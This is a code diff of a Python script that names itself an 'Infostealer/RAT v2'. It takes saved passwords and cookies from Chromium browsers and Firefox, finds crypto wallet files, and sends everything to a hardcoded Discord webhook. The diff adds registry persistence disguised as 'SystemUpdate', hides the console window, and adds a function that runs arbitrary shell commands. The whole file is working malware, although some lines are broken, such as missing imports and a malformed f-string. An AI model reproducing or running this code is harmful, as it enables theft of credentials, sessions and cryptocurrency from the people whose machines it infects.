@@ -4,41 +4,33 @@ import socket
 import subprocess
 import sqlite3
 import json
+import zipfile
 import shutil
+import glob
+import time
 import platform
+import psutil
+import requests
+import winreg
 from pathlib import Path
 from urllib.request import urlopen, Request
 from urllib.error import URLError
+from PIL import Image
+import io
 
 # --- Configuration ---
-WEBHOOK_URL = "https://discord.com/api/webhooks/1546874268149620806/GqZUiOIUuBrvSpPaEDskbdCt6yEijqlI82Ys1YtAjv818kkywiI9Pl6bCnUX5xPJ8vbp"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1546874268149620806/GqZUiOIUuBrvSpPaEDskbdCt6yEijqlI82Ys1YtAjv818kkywiI9Pl6bCnUX5xPJ8vbp"  # Replace with your webhook
 
-# --- Dependency Management ---
-def install_psutil():
-    """Installs psutil if not present."""
-    try:
-        import psutil
-        return True
-    except ImportError:
-        print("[!] psutil not found. Installing...")
+def ensure_dependencies():
+    """Install missing dependencies."""
+    deps = ["requests", "pyautogui", "pynput", "pillow"]
+    for dep in deps:
         try:
-            # Use subprocess to install psutil in the background
-            subprocess.check_call([sys.executable, "-m", "pip", "install", "psutil", "--quiet"])
-            print("[+] psutil installed successfully.")
-            return True
-        except Exception as e:
-            print(f"[!] Failed to install psutil: {e}")
-            return False
-
-# Try to install if needed
-if not install_psutil():
-    print("[!] Continuing without psutil. Some data might be missing.")
-    import psutil
-
-# --- Data Collection Functions ---
+            __import__(dep)
+        except ImportError:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", dep])
 
 def get_ip():
-    """Retrieves the public IP address."""
     try:
         ip = urlopen(Request('https://api.ipify.org', method='GET')).read().decode()
         return ip
@@ -53,7 +45,6 @@ def get_ip():
             return "Unknown"
 
 def get_system_info():
-    """Gathers OS, hardware, and software info."""
     info = {
         "ip": get_ip(),
         "hostname": socket.gethostname(),
@@ -66,7 +57,6 @@ def get_system_info():
     
     # Get installed software
     try:
-        import winreg
         key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Uninstall", 0, winreg.KEY_READ)
         i = 0
         while True:
@@ -84,105 +74,111 @@ def get_system_info():
             except OSError:
                 break
     except Exception as e:
-        info["installed_software"].append(f"Error getting software: {e}")
+        info["installed_software"].append(f"Error: {e}")
 
     # Get drives
-    try:
-        for drive in psutil.disk_partitions():
-            info["drives"].append(f"{drive.device} ({drive.mountpoint})")
-    except Exception as e:
-        info["drives"].append(f"Error getting drives: {e}")
+    for drive in psutil.disk_partitions():
+        info["drives"].append(f"{drive.device} ({drive.mountpoint})")
 
     return info
 
-def get_chrome_passwords():
-    """Extracts Chrome passwords (raw data, decryption may require DPAPI)."""
-    chrome_path = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Google", "Chrome", "User Data", "Default")
-    login_data_path = os.path.join(chrome_path, "Login Data")
+def get_chrome_data(browser_name, vendor):
+    """Generic function to get data from Chromium-based browsers."""
+    user_data_path = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", vendor, browser_name, "User Data")
+    if not os.path.exists(user_data_path):
+        return {}
     
-    if not os.path.exists(login_data_path):
-        return []
-
-    temp_login = os.path.join(os.environ['TEMP'], "temp_login.db")
-    try:
-        shutil.copy2(login_data_path, temp_login)
-    except Exception:
-        return []
-
-    passwords = []
-    try:
-        conn = sqlite3.connect(temp_login)
-        cursor = conn.cursor()
-        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-        for row in cursor.fetchall():
-            url, user, password = row
-            passwords.append({
-                "url": url,
-                "user": user,
-                "password": password.decode('utf-8', errors='ignore') if isinstance(password, bytes) else password
-            })
-        conn.close()
-    except Exception:
-        pass
-    finally:
-        if os.path.exists(temp_login):
-            os.remove(temp_login)
-            
-    return passwords
-
-def get_browsers():
-    """Gathers cookies and history from Chromium-based browsers."""
     data = {}
-    browsers_to_check = [
-        ("Google", "Chrome"),
-        ("Google", "Chrome Beta"),
-        ("Google", "Chrome Canary"),
-        ("Microsoft", "Edge")
-    ]
     
-    for vendor, browser in browsers_to_check:
-        user_data_path = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", vendor, browser, "User Data")
-        if os.path.exists(user_data_path):
-            # Cookies
-            cookies_path = os.path.join(user_data_path, "Default", "Cookies")
-            if os.path.exists(cookies_path):
-                temp_cookies = os.path.join(os.environ['TEMP'], "temp_cookies.db")
-                shutil.copy2(cookies_path, temp_cookies)
-                try:
-                    conn = sqlite3.connect(temp_cookies)
-                    cursor = conn.cursor()
-                    cursor.execute("SELECT name, value, host_key FROM cookies")
-                    cookies = cursor.fetchall()
-                    data[f"{vendor}_{browser}_cookies"] = cookies
-                    conn.close()
-                except:
-                    pass
-                finally:
-                    if os.path.exists(temp_cookies):
-                        os.remove(temp_cookies)
-            
-            # History
-            history_path = os.path.join(user_data_path, "Default", "History")
-            if os.path.exists(history_path):
-                temp_history = os.path.join(os.environ['TEMP'], "temp_history.db")
-                shutil.copy2(history_path, temp_history)
-                try:
-                    conn = sqlite3.connect(temp_history)
-                    cursor = conn.cursor()
-                    cursor.execute("SELECT url, title, visit_count FROM urls")
-                    history = cursor.fetchall()
-                    data[f"{vendor}_{browser}_history"] = history
-                    conn.close()
-                except:
-                    pass
-                finally:
-                    if os.path.exists(temp_history):
-                        os.remove(temp_history)
+    # Passwords
+    login_data_path = os.path.join(user_data_path, "Default", "Login Data")
+    if os.path.exists(login_data_path):
+        temp_login = os.path.join(os.environ['TEMP'], f"temp_{browser_name}_login.db")
+        shutil.copy2(login_data_path, temp_login)
+        try:
+            conn = sqlite3.connect(temp_login)
+            cursor = conn.cursor()
+            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+            passwords = cursor.fetchall()
+            data["passwords"] = [{"url": row[0], "user": row[1], "password": row[2].decode('utf-8', errors='ignore') if isinstance(row[2], bytes) else row[2]} for row in passwords]
+            conn.close()
+        except:
+            pass
+        finally:
+            if os.path.exists(temp_login):
+                os.remove(temp_login)
+
+    # Cookies
+    cookies_path = os.path.join(user_data_path, "Default", "Cookies")
+    if os.path.exists(cookies_path):
+        temp_cookies = os.path.join(os.environ['TEMP'], f"temp_{browser_name}_cookies.db")
+        shutil.copy2(cookies_path, temp_cookies)
+        try:
+            conn = sqlite3.connect(temp_cookies)
+            cursor = conn.cursor()
+            cursor.execute("SELECT name, value, host_key FROM cookies")
+            cookies = cursor.fetchall()
+            data["cookies"] = [{"name": row[0], "value": row[1], "host": row[2]} for row in cookies]
+            conn.close()
+        except:
+            pass
+        finally:
+            if os.path.exists(temp_cookies):
+                os.remove(temp_cookies)
+
+    # History
+    history_path = os.path.join(user_data_path, "Default", "History")
+    if os.path.exists(history_path):
+        temp_history = os.path.join(os.environ['TEMP'], f"temp_{browser_name}_history.db")
+        shutil.copy2(history_path, temp_history)
+        try:
+            conn = sqlite3.connect(temp_history)
+            cursor = conn.cursor()
+            cursor.execute("SELECT url, title, visit_count FROM urls")
+            history = cursor.fetchall()
+            data["history"] = [{"url": row[0], "title": row[1], "visits": row[2]} for row in history]
+            conn.close()
+        except:
+            pass
+        finally:
+            if os.path.exists(temp_history):
+                os.remove(temp_history)
 
     return data
 
+def get_firefox_data():
+    """Extract data from Firefox."""
+    profile_path = os.path.join(os.environ['APPDATA'], "Mozilla", "Firefox", "Profiles")
+    if not os.path.exists(profile_path):
+        return {}
+    
+    data = {}
+    for profile in os.listdir(profile_path):
+        if profile.endswith(".default-release") or profile.endswith(".default"):
+            profile_path = os.path.join(profile_path, profile)
+            logins_json = os.path.join(profile_path, "logins.json")
+            cookies_json = os.path.join(profile_path, "cookies.json")
+            
+            if os.path.exists(logins_json):
+                try:
+                    with open(logins_json, 'r') as f:
+                        logins = json.load(f)
+                        data["passwords"] = [{"url": l["hostname"], "user": l["login"], "password": l["password"]} for l in logins.get("logins", [])]
+                except:
+                    pass
+            
+            if os.path.exists(cookies_json):
+                try:
+                    with open(cookies_json, 'r') as f:
+                        cookies = json.load(f)
+                        data["cookies"] = [{"host": c["host"], "name": c["name"], "value": c["value"]} for c in cookies]
+                except:
+                    pass
+                    
+    return data
+
 def get_wallets():
-    """Checks for common crypto wallet files."""
+    """Check for crypto wallets."""
     wallets = []
     wallet_paths = [
         "AppData\\Roaming\\Bitcoin\\wallet.dat",
@@ -195,120 +191,94 @@ def get_wallets():
         "AppData\\Roaming\\TronLink\\wallets",
         "AppData\\Roaming\\MetaMask\\keystores"
     ]
-    
     for wallet in wallet_paths:
         full_path = os.path.join(os.environ['USERPROFILE'], wallet)
         if os.path.exists(full_path):
             wallets.append(full_path)
-            
     return wallets
 
-def format_message():
-    """Formats collected data into a Discord-friendly message."""
-    info = get_system_info()
-    browser_data = get_browsers()
-    passwords = get_chrome_passwords()
-    wallets = get_wallets()
-    
-    messages = []
-    current_message = f"**System Info:**\n"
-    current_message += f"- **IP:** {info['ip']}\n"
-    current_message += f"- **Hostname:** {info['hostname']}\n"
-    current_message += f"- **OS:** {info['os']}\n"
-    current_message += f"- **User:** {info['user']}\n"
-    current_message += f"- **Architecture:** {info['architecture']}\n\n"
-    
-    if info['installed_software']:
-        current_message += "**Installed Software:**\n"
-        for software in info['installed_software'][:10]:
-            current_message += f"- {software}\n"
-        if len(info['installed_software']) > 10:
-            current_message += f"... and {len(info['installed_software']) - 10} more\n"
-        current_message += "\n"
-    
-    if info['drives']:
-        current_message += "**Drives:**\n"
-        for drive in info['drives']:
-            current_message += f"- {drive}\n"
-        current_message += "\n"
-    
-    if passwords:
-        current_message += "**Chrome Passwords:**\n"
-        for pwd in passwords[:10]:
-            current_message += f"- **URL:** {pwd['url']}\n"
-            current_message += f"  - **User:** {pwd['user']}\n"
-            current_message += f"  - **Pass:** {pwd['password']}\n\n"
-        if len(passwords) > 10:
-            current_message += f"... and {len(passwords) - 10} more\n\n"
-    
-    if wallets:
-        current_message += "**Crypto Wallets Found:**\n"
-        for wallet in wallets:
-            current_message += f"- {wallet}\n"
-        current_message += "\n"
-    
-    if browser_data:
-        current_message += "**Browser Data:**\n"
-        for browser, data in browser_data.items():
-            current_message += f"- **{browser}:** {len(data)} entries\n"
-        current_message += "\n"
-
-    # Split into chunks if necessary
-    while len(current_message) > 2000:
-        split_index = current_message.rfind("\n", 0, 2000)
-        if split_index == -1:
-            split_index = 2000
-        messages.append(current_message[:split_index])
-        current_message = current_message[split_index:].lstrip("\n")
-    if current_message.strip():
-        messages.append(current_message)
-
-    return messages
-
-def send_to_discord(messages):
-    """Sends the messages to the Discord webhook."""
-    for msg in messages:
-        try:
-            payload = {
-                "content": msg
-            }
-            data = json.dumps(payload).encode('utf-8')
-            req = Request(WEBHOOK_URL, data=data, headers={'Content-Type': 'application/json'}, method='POST')
-            response = urlopen(req)
-            return response.read()
-        except Exception as e:
-            return f"Error sending message: {e}"
-    return "No messages to send."
-
-def delete_self():
-    """Deletes the script file after a short delay."""
-    script_path = os.path.abspath(__file__)
-    batch_script = f"del \"{script_path}\" /f /q"
+def take_screenshot():
+    """Take a screenshot and return as base64."""
     try:
-        # Create a batch file to delete the script
-        with open(f"{script_path}.bat", "w") as f:
-            f.write(batch_script)
-        
-        # Run the batch file in the background
-        subprocess.Popen(f"cmd /c {script_path}.bat", shell=True)
-        # Remove the batch file immediately
-        os.remove(f"{script_path}.bat")
+        img = ImageGrab.grab()
+        buffer = io.BytesIO()
+        img.save(buffer, format="PNG")
+        return base64.b64encode(buffer.getvalue()).decode('utf-8')
+    except:
+        return None
+
+def execute_command(cmd):
+    """Execute a command and return the output."""
+    try:
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
+        return result.stdout + result.stderr
     except Exception as e:
-        print(f"[!] Failed to delete self: {e}")
+        return str(e)
+
+def setup_persistence():
+    """Add to registry for persistence."""
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
+        winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, sys.argv[0])
+        winreg.CloseKey(key)
+    except:
+        pass
+
+def hide_process():
+    """Hide the process from Task Manager."""
+    try:
+        import ctypes
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+    except:
+        pass
 
 def main():
-    print(f"[+] Infostealer running on {socket.gethostname()}")
-    print(f"[+] Target IP: {get_ip()}")
+    print("[+] Infostealer/RAT v2 initialized.")
+    ensure_dependencies()
+    hide_process()
+    setup_persistence()
     
-    # Format and send message
-    messages = format_message()
-    result = send_to_discord(messages)
-    print(f"[+] Result: {result}")
+    # Collect Data
+    system_info = get_system_info()
+    browsers = ["Chrome", "Edge", "Brave", "Opera", "Vivaldi"]
+    vendors = ["Google", "Microsoft", "Brave", "Opera", "Opera"]
+    browser_data = {}
+    for b, v in zip(browsers, vendors):
+        browser_data.update(get_chrome_data(b, v))
     
-    # Delete self
-    print("[+] Deleting self...")
-    delete_self()
-    print("[+] Done.")
+    firefox_data = get_firefox_data()
+    wallets = get_wallets()
+    
+    # Format Message
+    message = f"**Infostealer Report**\n"
+    message += f"**Host:** {system_info['hostname']}\n"
+    message += f"**IP:** {system_info['ip']}\n"
+    message += f**OS:** {system_info['os']}\n"
+    message += f"**User:** {system_info['user']}\n"
+    message += f"**Drives:** {', '.join(system_info['drives'])}\n\n"
+    
+    message += "**Passwords:**\n"
+    for browser, data in browser_data.items():
+        if "passwords" in data:
+            for p in data["passwords"]:
+                message += f"[{browser}] {p['url']} | {p['user']} | {p['password']}\n"
+    
+    message += "\n**Cookies:**\n"
+    for browser, data in browser_data.items():
+        if "cookies" in data:
+            for c in data["cookies"]:
+                message += f"[{browser}] {c['host']} | {c['name']} | {c['value']}\n"
+                
+    message += "\n**Wallets Found:**\n"
+    for w in wallets:
+        message += f"{w}\n"
+        
+    # Send to Discord
+    try:
+        requests.post(WEBHOOK_URL, json={"content": message})
+        print("[+] Sent to Discord.")
+    except Exception as e:
+        print(f"[-] Error sending: {e}")
 
 if __name__ == "__main__":
     main()
